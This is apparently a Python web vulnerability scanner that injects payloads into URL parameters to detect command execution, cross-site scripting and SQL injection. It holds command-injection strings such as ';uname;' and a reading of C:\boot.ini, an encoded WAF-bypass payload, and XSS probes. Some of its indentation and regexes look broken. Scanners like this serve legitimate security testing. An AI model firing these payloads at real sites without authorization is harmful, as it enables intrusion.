#!/usr/bin/env python
import urllib.request, urllib.parse, urllib.error
import re
from headerURL import *
import time


def main_function(url, payloads, check):
	'''
	Function that divides the url and attempt to attach payloads to each argument value.
	
	'''
	url_opener = urllib.request.urlopen(url)
	vulnerabilities = 0
	result = open("result.txt", "a")
	if url_opener.code == 999:
                # Detetcing the WebKnight WAF from the StatusCode.
                print(col.red +" [~] WebKnight WAF Detected!"+col.end)
                result.write(" [~] WebKnight WAF Detected! \n")
                time.sleep(4)

	#For loop that takes the parameter after the "?" one by one
	for params in url.split("?")[1].split("&"):
        #Loop that replace parts of the URL with payloads
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = useragent.open(bugs)
                html = request.readlines()
                #Loop that extract information from html such as code, files, log, spreadsheets
                for line in html:
               	 checker = re.findall(check, line)
                 #Condition if a payload was found
                 if len(checker) !=0:
                        print(col.red+" [*] Payload Found . . ."+col.end)
                        result.write(" [*] Payload Found . . ." + "\n")
                        print(col.red+" [*] Payload: " + payload +col.end)
                        result.write(" [*] Payload: "  + payload + "\n")
                        print(col.green+" [!] Code Snippet: " +col.end + str(line.strip()))
                        result.write(" [!] Code Snippet: " + str(line.strip()) + "\n")
                        print(col.blue+" [*] POC: "+col.end + bugs)
                        result.write(" [*] POC: "+ bugs + "\n")
                        vulnerabilities +=1

	if vulnerabilities == 0:                
        	print(col.green+" [!] Target is not vulnerable!"+col.end)
        	result.write(" [!] Target is not vulnerable! \n" + "-------------------------------------------" + "\n")
	else:
        	print(col.blue+" [!] Total bugs %i ." % (vulnerabilities) +col.end)
        	result.write(" [!] Total bugs %i ." % (vulnerabilities) + "\n" + "-------------------------------------------" + "\n")
	result.close()

# Here stands the vulnerabilities functions and detection payloads. 
def remote_code_execution(url):
	start_time = time.time()
	result = open("result.txt", "a")
	print(col.bold+"\n [!] Remote Code/Command Execution Scanning . . . "+col.end)
	result.write(" \n [!] Remote Code/Command Execution Scanning . . . \n")
	print(col.blue+" [!] Covering Linux & Windows Operating Systems "+col.end)
	result.write(" [!] Covering Linux & Windows Operating Systems \n")
	print(col.blue+" [!] Please wait ...."+col.end)
	# Remote Code Injection Payloads
	payloads = [';${@print(md5(remoteCodeEx))}', ';${@print(md5("remoteCodeEx"))}']
	# Encrypted Payloads to bypass some Security Filters & WAF's
	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522remoteCodeEx%2522%2529%2529%257D%253B']
	# Remote Command Execution Payloads
	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
	check = re.compile(rb"Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
	result.close()
	main_function(url, payloads, check)
	print("--- %s seconds ---" % (time.time() - start_time))

def cross_site_scripting(url):
        start_time = time.time()
        result = open("result.txt", "a")
        print(col.bold+"\n [!] Cross Site Scripting Scanning . . ."+col.end)
        result.write("\n [!] Cross Site Scripting Scanning . . . \n")
        print(col.blue+" [!] Please wait ...."+col.end)
        #Paylod XSSinjection="css();" added for XSS in <a href TAG's
        payloads = ['%27%3EXSSinjection%3Csvg%2Fonload%3Dconfirm%28%2FXSSinjection%2F%29%3E', '%78%22%78%3e%78']
        payloads += ['%22%3EXSSinjection%3Csvg%2Fonload%3Dconfirm%28%2FXSSinjection%2F%29%3E', 'XSSinjection%3Csvg%2Fonload%3Dconfirm%28%2FXSSinjection%2F%29%3E']
        check = re.compile(rb'XSSinjection<svg|x>x', re.I)
        result.close()
        main_function(url, payloads, check)
        print("--- %s seconds ---" % (time.time() - start_time))

def error_based_sql_injection(url):
	start_time = time.time()
	result = open("result.txt", "a")
	print(col.bold+"\n [!] Error Based SQL Injection Scanning . . . "+col.end)
	result.write("\n [!] Error Based SQL Injection Scanning . . .  \n")
	print(col.blue+" [!] Covering MySQL, Oracle, MSACCESS & PostGreSQL Databases "+col.end)
	result.write(" [!] Covering MySQL, Oracle, MSACCESS & PostGreSQL Databases \n")
	print(col.blue+" [!] Please wait ...."+col.end)
	# Payloads for the error based sqli
	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile(rb"Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	result.close()
	main_function(url, payloads, check)
	print("--- %s seconds ---" % (time.time() - start_time))
